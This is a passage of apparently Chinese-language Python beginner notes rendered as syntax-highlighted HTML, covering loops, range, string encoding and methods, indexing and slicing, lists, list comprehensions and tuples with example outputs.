class="string">while i&lt;=5:</span></span><br><span class="line"><span class="string">    print(&quot;1111&quot;)</span></span><br><span class="line"><span class="string">    i+=1</span></span><br><span class="line"><span class="string"># 死循环</span></span><br><span class="line"><span class="string">while True:</span></span><br><span class="line"><span class="string">    print(&quot;1&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#while循环计算1+2+3……+100</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">s=0</span></span><br><span class="line"><span class="string">out=0</span></span><br><span class="line"><span class="string">while s&lt;=100:</span></span><br><span class="line"><span class="string">    out+=s</span></span><br><span class="line"><span class="string">    s+=1</span></span><br><span class="line"><span class="string">print(out)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for循环——也叫做迭代循环</span></span><br><span class="line"><span class="comment">#格式如下：</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for 临时变量 in 可迭代对象:</span></span><br><span class="line"><span class="string">    循环满足条件执行的代码</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#可迭代对象就是要去遍历取值的整体，字符串是可迭代对象,能被for循环遍历取值</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s=&#x27;helloworld&#x27;</span></span><br><span class="line"><span class="string">for i in s:</span></span><br><span class="line"><span class="string">    print(i)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># range()函数用来记录循环次数，相当于计数器</span></span><br><span class="line"><span class="comment"># range()里面有三个参数，分别为start,end,step</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(1,6):</span></span><br><span class="line"><span class="string">    print(i)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span><span class="comment"># range 的 （   ） 遵循包前不包后原则，以上输出为1，2，3，4，5，类似于数学中的区间  [    )</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(5):</span></span><br><span class="line"><span class="string">    print(i)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span><span class="comment">#如果只写一个数，默认为循环次数，从0开始循环。以上输出为0，1，2，3，4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 例题：利用for循环计算1+2+3……+100</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a=1</span></span><br><span class="line"><span class="string">b=0</span></span><br><span class="line"><span class="string">for i in range(1,101):</span></span><br><span class="line"><span class="string">    b+=a</span></span><br><span class="line"><span class="string">    a+=1</span></span><br><span class="line"><span class="string">print(b)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  break 和  continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">break: 结束循环</span></span><br><span class="line"><span class="string">continue: 结束本次循环，进入下一次循环//////continue使用前注意修改计数器，否则会陷入死循环</span></span><br><span class="line"><span class="string">注：只能放到循环里面</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串编码-（本质上是二进制与语言文字的一一对应关系）</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Unicode：所有字符都是2个字节</span></span><br><span class="line"><span class="string">优点：字符与数字之间的转换速度快</span></span><br><span class="line"><span class="string">缺点：占用空间大</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">UTF-8: 对不同的字符用不同的长度表示</span></span><br><span class="line"><span class="string">优点：节省空间</span></span><br><span class="line"><span class="string">缺点：字符与数字的转换速度慢，每次都要计算字符要用多少个字节来表示</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#字符串编码转换</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">1.编码：  encode()</span></span><br><span class="line"><span class="string">    将其他编码的字符串转换成Unicode编码</span></span><br><span class="line"><span class="string">2.解码：  decode()</span></span><br><span class="line"><span class="string">    将Unicode编码的字符串转换成其他编码的字符串</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">a = &#x27;hello&#x27;</span></span><br><span class="line"><span class="string">print(type(a))#打印数据类型，输出&lt;class &#x27;str&#x27;&gt;，字符串类型</span></span><br><span class="line"><span class="string">a1 = a.encode()#进行编码</span></span><br><span class="line"><span class="string">print(a1)#打印a1,输出 b&#x27;hello&#x27;</span></span><br><span class="line"><span class="string">print(type(a1))#打印数据类型，输出&lt;class &#x27;bytes&#x27;&gt;，以字节为单位进行处理</span></span><br><span class="line"><span class="string">a2 = a1.decode()#解码</span></span><br><span class="line"><span class="string">print(a2,type(a2))#输出 hello &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">s=&#x27;hello world!!!&#x27;</span></span><br><span class="line"><span class="string">s1=s.encode(&quot;utf-8&quot;)</span></span><br><span class="line"><span class="string">print(s1,type(s1))</span></span><br><span class="line"><span class="string">s2=s1.decode(&quot;utf-8&quot;)</span></span><br><span class="line"><span class="string">print(s2,type(s2))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;hello world!!!&#x27; &lt;class &#x27;bytes&#x27;&gt;</span></span><br><span class="line"><span class="string">hello world!!! &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#字符串运算符</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ‘+’ 字符串拼接</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print(&quot;10&quot;+&quot;10&quot;)    # 输出 1010</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ‘*’ 字符串重复输出</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print(&quot;hello&quot;*5)    # 输出 hellohellohellohellohello（需要多少次，*后面写多少）</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 成员运算符（作用：检查字符串中是否包含某个子字符串）</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">in :如果包含，返回True,不包含返回False</span></span><br><span class="line"><span class="string">not in :包含返回False,不包含返回True</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">name=&#x27;helloworld&#x27;</span></span><br><span class="line"><span class="string">print(&#x27;e&#x27; in name)  #返回True</span></span><br><span class="line"><span class="string">print(&#x27;i&#x27; in name)  #返回False</span></span><br><span class="line"><span class="string">print(&#x27;e&#x27; not in name)  #返回False</span></span><br><span class="line"><span class="string">print(&#x27;i&#x27; not in name)  #返回True</span></span><br><span class="line"><span class="string">print(&#x27;ell&#x27; in name)    #返回True</span></span><br><span class="line"><span class="string">print(&#x27;ell&#x27; not in name)    #返回False</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#下标（索引）</span></span><br><span class="line"><span class="string">&#x27;python中从左往右数，下标从0开始！！！！！！！！！！！！！！！&#x27;</span></span><br><span class="line"><span class="string">&#x27;作用：通过下标能快速找到对应的数据！&#x27;</span></span><br><span class="line"><span class="string">&#x27;   格式：字符串名[下标值]  &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">name=&#x27;six&#x27;</span></span><br><span class="line"><span class="string">print(name[0])      #输出s</span></span><br><span class="line"><span class="string">print(name[1])      #输出i</span></span><br><span class="line"><span class="string">print(name[2])      #输出x</span></span><br><span class="line"><span class="string">#print(name[3])      #超出范围，报错！</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;下标从右往左数，从-1开始！！！&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print(name[-1],name[-2],name[-3])   #输出x i s</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#切片：对操作的对象截取一部分的操作</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#       语法：     [开始位置:结束未知:步长]</span></span><br><span class="line"><span class="string">#       包前不包后原则！！</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s=&#x27;abcdefghigklmn&#x27;</span></span><br><span class="line"><span class="string">print(s[0:4])   #输出abcd</span></span><br><span class="line"><span class="string">print(s[3:6])   #输出def</span></span><br><span class="line"><span class="string">print(s[3:])    #输出defghigklmn    表示下标3之后的全部截取</span></span><br><span class="line"><span class="string">print(s[:6])    #输出abcdef         表示下标7之前的全部截取</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(s[-1:])   #n</span></span><br><span class="line"><span class="string">print(s[:-1])   #abcdefghigklm</span></span><br><span class="line"><span class="string">#步长的绝对值大小决定切取的间隔，正负号表示切取方向，正数表示从左往右切，负数表示从右往左切,不写步长默认是1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(s[-1::1]) #输出n  表示的是从下标为-1的数从左往右切，只有s[-1]一个值</span></span><br><span class="line"><span class="string">print(s[-1:-5:-1])  #nmlk   表示从下标-1的数从右往左切，切到-5停止，不包含-5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print(s[0:7:2]) #aceg   表示从左往右切片，每2个间隔取一次</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#字符串常见操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.查找元素：</span></span><br><span class="line"><span class="comment"># find() 检测某个子字符串是否包含在字符串中，如果在就返回这个子字符串开始位置的下标，否则返回-1</span></span><br><span class="line"><span class="comment"># 格式：  find(子字符串，开始位置下标，结束位置下标)  开始和结束位置下标可以省略，表示在整个字符串中查找</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">name=&#x27;bingbingbangbang&#x27;</span></span><br><span class="line"><span class="string">print(name.find(&#x27;b&#x27;))   #输出0，检测到bing</span></span><br><span class="line"><span class="string">print(name.find(&#x27;b&#x27;,4)) #输出4，表示从下标4向后开始查找</span></span><br><span class="line"><span class="string">print(name.find(&#x27;bing&#x27;,4,10))   #输出4，表示从下标4到10查找‘bing’</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.index()  检测某个子字符串是否包含在字符串中，如果在就返回这个子字符串开始位置的下标，否则报错！</span></span><br><span class="line"><span class="comment">#格式       index(子字符串，开始位置下标，结束位置下标)     开始和结束位置下标可以省略，表示在整个字符串中查找</span></span><br><span class="line"><span class="comment">#和find的区别：find没有找到返回-1，index则会报错！</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n=&#x27;hahayou&#x27;</span></span><br><span class="line"><span class="string">#print(n.index(&#x27;h&#x27;,4))   #没有找到，会报错！</span></span><br><span class="line"><span class="string">print(n.index(&#x27;ha&#x27;))    #0 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.count()  返回某个子字符串在整个字符串中出现的次数，没有则返回0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">s=&#x27;冰冰邦邦！&#x27;</span></span><br><span class="line"><span class="string">print(s.count(&#x27;冰&#x27;))    #输出2，‘冰’出现过两次！</span></span><br><span class="line"><span class="string">print(s.count(&#x27;冰&#x27;,1))  #输出1，从1往后找‘冰’出现过1次！</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#判断</span></span><br><span class="line"><span class="comment">#   startswith()    是否以某个字符串开头，是返回Ture，否则返回False，如果设置开始和结束位置下标，则在指定范围内查找</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">s=&#x27;heloworld&#x27;</span></span><br><span class="line"><span class="string">print(s.startswith(&#x27;he&#x27;))   #返回True</span></span><br><span class="line"><span class="string">print(s.startswith(&#x27;wor&#x27;,4))   #返回True</span></span><br><span class="line"><span class="string">print(s.startswith(&#x27;he&#x27;,1))     #返回False</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#   endswith()  是否以某个字符串结束，是返回Ture，否则返回False，如果设置开始和结束位置下标，则在指定范围内查找</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">s=&#x27;heloworld&#x27;</span></span><br><span class="line"><span class="string">print(s.endswith(&#x27;ld&#x27;))     #返回True</span></span><br><span class="line"><span class="string">print(s.endswith(&#x27;h&#x27;))      #返回False</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#   isupper()   字母是否全为大写，是返回Ture，否则返回False，如果设置开始和结束位置下标，则在指定范围内查找</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#   修改元素</span></span><br><span class="line"><span class="comment"># 1. replace()  替换    格式：replace(旧内容，新内容，替换次数)，替换次数可以省略，默认全部替换</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">name=&#x27;hahaha&#x27;</span></span><br><span class="line"><span class="string">print(name.replace(&#x27;ha&#x27;,&#x27;1&#x27;))   #输出111</span></span><br><span class="line"><span class="string">print(name.replace(&#x27;ha&#x27;,&#x27;1&#x27;,1)) #输出1haha  只替换1次</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#   split() 指定分隔符来切割字符串，以列表的形式返回，如果字符串中不包含分割内容，就不进行分割，会作为一个整体</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">name=&#x27;ha,ha,ha&#x27;</span></span><br><span class="line"><span class="string">print(name.split(&#x27;,&#x27;))  #输出 [&#x27;ha&#x27;, &#x27;ha&#x27;, &#x27;ha&#x27;] 按‘,’分割</span></span><br><span class="line"><span class="string">print(name.split(&#x27;a&#x27;))  #输出 [&#x27;h&#x27;, &#x27;,h&#x27;, &#x27;,h&#x27;, &#x27;&#x27;] 按a分割</span></span><br><span class="line"><span class="string">print(name.split(&#x27;,&#x27;,1))    #输出[&#x27;ha&#x27;, &#x27;ha,ha&#x27;] 指定只分割一次！</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#   capitalize(): 第一个字符大写，其他都小写</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print(&#x27;bingBingBangbang&#x27;.capitalize())  #返回 Bingbingbangbang</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#   lower()  大写字母转为小写</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print(&quot;BINGBINGBANGBANG&quot;.lower())   #返回bingbingbangbang</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#  upper()  小写字母转大写</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print(&quot;bingbingbangbang&quot;.upper()) #返回BINGBINGBANGBANG</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#     列表</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">定义：是处理一组有序项目的数据结构</span></span><br><span class="line"><span class="string">格式：列表名=[元素1，元素2，元素3……]</span></span><br><span class="line"><span class="string">注意：列表中所有元素放在[]中，并使用逗号隔开，一个列表中的数据类型可以不同</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">li=[1,2,3,4]</span></span><br><span class="line"><span class="string">print(type(li))     # &lt;class &#x27;list&#x27;&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">列表可以进行切片操作</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print(li[0:3])      # [1, 2, 3]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;列表也是可迭代对象，可以for循环遍历取值&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in li:</span></span><br><span class="line"><span class="string">    print(i)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">输出</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">3</span></span><br><span class="line"><span class="string">4</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 列表常见操作</span></span><br><span class="line"><span class="comment"># 1.添加元素</span></span><br><span class="line"><span class="comment">#    append()整体添加   extend()分散添加，将另外一个类型中的元素逐一添加,只能添加可迭代对象    insert()在指定位置插入元素，原来该位置的元素会后移</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">li=[1,2,3,4]</span></span><br><span class="line"><span class="string">li.append(&quot;four&quot;)</span></span><br><span class="line"><span class="string">print(li)   # 输出 [1, 2, 3, 4, &#x27;four&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">li.extend(&#x27;six&#x27;)</span></span><br><span class="line"><span class="string">print(li)   # 输出 [1, 2, 3, 4, &#x27;four&#x27;, &#x27;s&#x27;, &#x27;i&#x27;, &#x27;x&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">li.insert(3,&#x27;ten&#x27;)</span></span><br><span class="line"><span class="string">print(li)   # 输出 [1, 2, 3, &#x27;ten&#x27;, 4, &#x27;four&#x27;, &#x27;s&#x27;, &#x27;i&#x27;, &#x27;x&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改元素</span></span><br><span class="line"><span class="comment">#直接通过下标就可以进行修改</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">li=[1,2,3,4]</span></span><br><span class="line"><span class="string">print(li[1])    #输出2</span></span><br><span class="line"><span class="string">li[1]=&#x27;ha&#x27;</span></span><br><span class="line"><span class="string">print(li[1])    #输出ha</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#查找元素</span></span><br><span class="line"><span class="comment"># in       not in   和字符串中的用法一样</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">l=[1,2,3]</span></span><br><span class="line"><span class="string">print(1 in l)   #返回True</span></span><br><span class="line"><span class="string">print(1 not in l)   #返回False</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#实例：(检测用户输入昵称是否存在)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">name_list=[&#x27;my3171&#x27;,&#x27;qwer&#x27;,&#x27;bingbingbangbang&#x27;,&#x27;Y&amp;Y&#x27;,&#x27;我真的害怕极了&#x27;]</span></span><br><span class="line"><span class="string">while True:</span></span><br><span class="line"><span class="string">    name=input(&quot;请输入您的昵称！&quot;)</span></span><br><span class="line"><span class="string">    if name in name_list:</span></span><br><span class="line"><span class="string">        print(f&quot;昵称&#123;name&#125;已被占用！&quot;)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        name_list.append(name) #把新的昵称放入列表</span></span><br><span class="line"><span class="string">        print(f&quot;成功注册昵称&#123;name&#125;！&quot;)</span></span><br><span class="line"><span class="string">        print(name_list)</span></span><br><span class="line"><span class="string">        break</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># index 返回指定数据所在位置的下标，如果查找的数据不存在就会报错</span></span><br><span class="line"><span class="comment"># count 统计指定数据在当前列表出现的次数</span></span><br><span class="line"><span class="comment"># 跟字符串用法相同</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#删除列表元素</span></span><br><span class="line"><span class="comment"># del</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">li=[&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;]</span></span><br><span class="line"><span class="string">#del li      #删除整个列表</span></span><br><span class="line"><span class="string">#print(li)   #报错，因为列表已经被删除！</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">del li[2]</span></span><br><span class="line"><span class="string">print(li)   #[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;d&#x27;]    根据下标删除</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pop</span></span><br><span class="line"><span class="comment">#删除指定下标的数据，不写下标python3版本会默认删除最后一个元素！</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">l=[1,2,3,4]</span></span><br><span class="line"><span class="string">l.pop()</span></span><br><span class="line"><span class="string">print(l)    #[1, 2, 3]</span></span><br><span class="line"><span class="string">l.pop(2)</span></span><br><span class="line"><span class="string">print(l)    #[1, 2] 指定下标删除，超出下标范围则报错！</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#remove</span></span><br><span class="line"><span class="comment">#根据元素的值进行删除</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">li=[1,2,3,&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;bbbb&#x27;]</span></span><br><span class="line"><span class="string">li.remove(&#x27;a&#x27;)</span></span><br><span class="line"><span class="string">print(li)   #[1, 2, 3, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;bbbb&#x27;]</span></span><br><span class="line"><span class="string">li.remove(2)</span></span><br><span class="line"><span class="string">print(li)   #[1, 3, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;bbbb&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#如果有重复的元素，默认删除最开始出现的元素</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#   列表排序</span></span><br><span class="line"><span class="comment">#   sort():将列表按照特定顺序重新排列，默认从小到大</span></span><br><span class="line"><span class="comment">#   reverse():倒序，将列表倒置过来</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">li=[1,5,2,7,4,3,0,9,8]</span></span><br><span class="line"><span class="string">li.sort()</span></span><br><span class="line"><span class="string">print(li)   #[0, 1, 2, 3, 4, 5, 7, 8, 9]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">li.reverse()</span></span><br><span class="line"><span class="string">print(li)   #[9, 8, 7, 5, 4, 3, 2, 1, 0]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#【重点】【列表推导式】</span></span><br><span class="line"><span class="comment">#格式：     [表达式 for 变量 in 列表]  或  [表达式 for 变量 in 列表 if 条件]</span></span><br><span class="line"><span class="comment"># in 后面不仅仅可以放列表，还可以放range()函数，可迭代对象</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">li=[1,2,3,4]</span></span><br><span class="line"><span class="string">[print(i) for i in li]      #输出1 2 3 4</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">li=[]</span></span><br><span class="line"><span class="string">[li.append(i) for i in range(0,9)]</span></span><br><span class="line"><span class="string">print(li)       # 输出[0, 1, 2, 3, 4, 5, 6, 7, 8]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#把奇数放进列表</span></span><br><span class="line"><span class="string">li=[]</span></span><br><span class="line"><span class="string">[li.append(i) for i in range(0,9) if(i%2!=0)]</span></span><br><span class="line"><span class="string">print(li)       # 输出[1, 3, 5, 7]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#把1-50的偶数放进列表</span></span><br><span class="line"><span class="string">li=[]</span></span><br><span class="line"><span class="string">[li.append(i) for i in range(1,51) if(i%2==0)]</span></span><br><span class="line"><span class="string">print(li)       # 输出[2, 4, 6, 8, 10, 12, 14, 16, 18, 20, 22, 24, 26, 28, 30, 32, 34, 36, 38, 40, 42, 44, 46, 48, 50]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#列表嵌套————一个列表里面又有列表</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">li=[1,2,3,[4,5,6],7,8,9]    #[4,5,6]是内层列表</span></span><br><span class="line"><span class="string">print(li[3])    # 输出[4, 5, 6]   取出里面的列表</span></span><br><span class="line"><span class="string">print(li[3][0]) # 输出4     取出内列表中的元素</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 元组</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">格式：元组名=(元素1,元素2,元素3)</span></span><br><span class="line"><span class="string">注意：所有元素放在()中，并使用逗号隔开，一个元组中的数据类型可以不同,元组中只有一个元素的时候，末尾必须加上逗号！！！！</span></span><br><span class="line"><span class="string">应用场景：</span></span><br><span class="line"><span class="string">    1.  函数的参数和返回值  </span></span><br><span class="line"><span class="string">    2.  %格式化输出后面的()本质上是一个元组</span></span><br><span class="line"><span class="string">    3.  数据不可以被修改，保护数据的安全</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">t=(1,2,3,4)</span></span><br><span class="line"><span class="string">print(type(t))  # &lt;class &#x27;tuple&#x27;&gt;</span></span><br><span class="line"><span class="string">tua=() #定义空元组</span></span><br><span class="line"><span class="string">tp=(1,) #定义只有一个元素的元组</span></span><br><span class="line"><span class="string">print(t[2]) #输出3</span></span><br><span class="line"><span class="string">print(len(t))   #输出4</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#注意：元组只能支持查询操作，不支持进行增加，删除，修改的操作！！！  （与列表的区别），元组可以使用count(),index(),len()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#元组可以进行切片操作！！！</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print(t[2:])    #输出(3, 